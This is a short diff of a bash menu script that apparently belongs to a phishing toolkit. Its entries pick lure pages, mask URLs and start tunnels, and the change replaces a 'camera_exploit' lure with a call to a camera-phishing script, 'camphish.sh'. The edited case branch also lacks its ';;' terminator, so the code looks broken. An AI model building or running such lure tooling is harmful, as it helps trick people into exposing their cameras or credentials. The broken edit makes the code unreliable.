@@ -997,9 +997,7 @@ main_menu() {
 			website="wifi"
 			tunnel_menu;;
 		27)
-			website="camera_exploit"
-			mask='https://example.com/camera'
-			tunnel_menu;;
+			cd camera; bash camphish.sh
 		99)
 			about;;
 		0 | 00 )
